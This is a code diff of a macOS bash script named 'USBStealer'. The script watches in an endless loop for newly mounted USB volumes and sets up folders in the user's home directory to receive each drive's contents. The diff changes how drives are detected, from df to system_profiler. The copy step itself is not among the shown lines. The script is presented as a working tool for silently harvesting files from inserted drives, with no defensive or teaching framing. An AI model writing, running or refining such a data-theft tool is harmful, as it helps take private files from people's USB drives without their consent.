@@ -9,11 +9,11 @@ Directory="/Users/$(whoami)"
 if [[ $1 = -v ]]; then
 	echo "Running Verbose Mode"
 fi
-var=$(df | grep -o "/dev/disk2[^ ]*" | wc -l )
-if [[ $(df | grep -o "/dev/disk2[^ ]*" | wc -l) -eq 1 ]]; then
+var=$(system_profiler SPUSBDataType | grep -o "/Volumes[^ ]*" | wc -l )
+if [[ $(system_profiler SPUSBDataType | grep -o "/Volumes[^ ]*" | wc -l) -eq 1 ]]; then
 	echo "USB Connected"
 	sleep 1
-	name=$(df | grep "/dev/disk2" | grep -o "Volumes/[^ ]*")
+	name=$(system_profiler SPUSBDataType | grep -o "/Volumes[^ ]*")
 	mkdir $Directory/USBStealer > /dev/null 2>&1
 	mkdir $Directory/USBStealer/$(basename $name) > /dev/null 2>&1
 	if [[ $1 = -v ]]; then
@@ -25,10 +25,10 @@ if [[ $(df | grep -o "/dev/disk2[^ ]*" | wc -l) -eq 1 ]]; then
 fi
 fi
 while true; do 
-if [[ $(df | grep -o "/dev/disk2[^ ]*" | wc -l) -gt $var ]]; then
+if [[ $(system_profiler SPUSBDataType | grep -o "/Volumes[^ ]*" | wc -l) -gt $var ]]; then
 	echo "USB Connected"
 	sleep 1
-	name=$(df | grep "/dev/disk2" | grep -o "Volumes/[^ ]*")
+	name=$(system_profiler SPUSBDataType | grep -o "/Volumes[^ ]*")
 	mkdir $Directory/USBStealer > /dev/null 2>&1
 	mkdir $Directory/USBStealer/$(basename $name) > /dev/null 2>&1
 	if [[ $1 = -v ]]; then
@@ -38,7 +38,7 @@ if [[ $(df | grep -o "/dev/disk2[^ ]*" | wc -l) -gt $var ]]; then
 fi
     echo "Transfer Finished"
 	((var+=1))
-elif [[ $(df | grep -o "/dev/disk2[^ ]*" | wc -l) -lt $var ]]; then
+elif [[ $(system_profiler SPUSBDataType | grep -o "/Volumes[^ ]*" | wc -l) -lt $var ]]; then
 	echo "USB Disconnected"
 	((var-=1))
 fi
